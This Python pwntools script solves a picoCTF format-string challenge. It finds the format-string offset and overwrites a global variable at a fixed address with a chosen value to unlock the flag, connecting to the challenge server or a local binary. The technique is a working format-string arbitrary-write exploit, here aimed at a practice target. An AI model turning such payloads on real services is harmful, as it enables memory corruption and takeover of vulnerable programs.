#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rhea.picoctf.net", 65139)

    return r

program = pwnlib.data.elf.fmtstr.get('i386')
def exec_fmt(payload):
    r = process([exe.path])
    r.sendline(payload)
    return r.recvall()



def main():
    r = conn()
    #using GDB we can find that the address of sus is 0x404060 
    #so now we have to overwrite that address with the value 0x67616c66 to get the flag
    #pwntools provide us with the powerfull Fmtstr tool that creates that payload for us
    
    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset
    payload = fmtstr_payload(offset, {0x404060: 0x67616c66})
    r.sendline(payload)
    print(r.recv())
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
